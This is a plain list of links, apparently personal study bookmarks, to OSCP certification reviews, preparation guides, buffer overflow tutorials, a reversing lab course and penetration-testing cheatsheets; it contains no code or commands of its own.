<https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/> <https://netsec.ws/?p=398> <https://jhalon.github.io/OSCP-Review/> <https://hakin9.org/try-harder-my-penetration-testing-with-kali-linux-oscp-review-and-courselab-experience-my-oscp-review-by-jason-bernier/> <https://h4ck.co/oscp-journey-pwk-course-review/> <https://awansec.com/oscp-review.html> <http://jameelnabbo.com/oscp-preparation-guide-and-exam-review/> <https://www.linkedin.com/pulse/oscp-review-nick-frichette> <https://www.secjuice.com/oscp-prep-guidance/> <https://www.jimwilbur.com/2017/07/oscp-review/> <https://www.hackingtutorials.org/hacking-courses/offensive-security-certified-professional-oscp/> <https://clintonmetu.com/2018/06/how-i-prepared-for-the-pwk-course-and-oscp-exam-oscp-exam-review/> <http://dsolstad.com/PWK-OSCP-Review/> <https://medium.com/@forwardsecrecy/oscp-post-exam-and-final-review-448e51bf7dae> <https://medium.com/@LearnerPentest/oscp-i-did-it-af9ee3335a1c> <http://dann.com.br/oscp-offensive-security-certification-pwk-course-review/> <http://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/> <http://ly0n.me/2018/04/30/offensive-security-certs-oscp-and-osce-review/> <https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html> <https://dubell.io/my-oscp-review/> <https://m4cybersolutions.com/oscp-review/> <https://dejandayoff.com/oscp-review---felt-the-pain-and-suffered-through-it/> <https://stormctf.ninja/ctf/blog/c0ax/review/oscp-review> <https://github.com/D3cl4n/OSCP-Review> <https://community.infosecinstitute.com/discussion/132306/oscp-review> <https://ethicalhackers.club/oscp-penetration-testing-kali-linux-experience-review/> <https://limbenjamin.com/articles/oscp-review.html> <http://www.exumbraops.com/blog/2018/4/6/7-things-you-didnt-know-about-passing-the-oscp> <http://www.websecgeeks.com/2017/04/penetration-testing-with-kali-linux.html> <https://blog.fadyothman.com/pwk-and-oscp-my-experience/> <https://wiki.securityweekly.com/Hack_Naked_TV_OSCP_Review> <https://dilsec.com/2017/04/06/oscp-certification-the-review/> <https://infosecuritygeek.com/my-oscp-journey/> <https://kongwenbin.wordpress.com/2017/02/23/officially-oscp-certified/> <https://raaqim.me/2017/07/26/oscp-review-different/> <https://hackmethod.com/oscp-review-tips/> <https://www.ethicalhacker.net/forums/forum/ethical-hacking-discussions-and-related-certifications/network-pen-testing/oscp-offensive-security-certified-professional/page/1/> <https://www.arcade-desk.com/index.php/2018/08/06/oscp-review/> <https://thor-sec.com/review/oscp/oscp_review/>

<http://www.digitaloffensive.com/category/oscp/>

<https://www.thecybermentor.com/zero-to-hero-pentesting>

<https://www.puckiestyle.nl/oscp-journey-1st-month/>

<https://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/> <http://www.offensive-security.com/0day/freepbx_callmenum.py.txt>

<https://malikashish8.github.io/Walkthrough/notes/>

<https://cs485.mjkranch.com/lessons.html>

<https://tcm-sec.com/2019/05/25/buffer-overflows-made-easy/>

reversing

<https://ocw.cs.pub.ro/courses/cns/labs/start>

<https://github.com/OlivierLaflamme/Cheatsheet-God>

<https://book.hacktricks.xyz/exploiting/windows-exploiting-basic-guide-oscp-lvl>
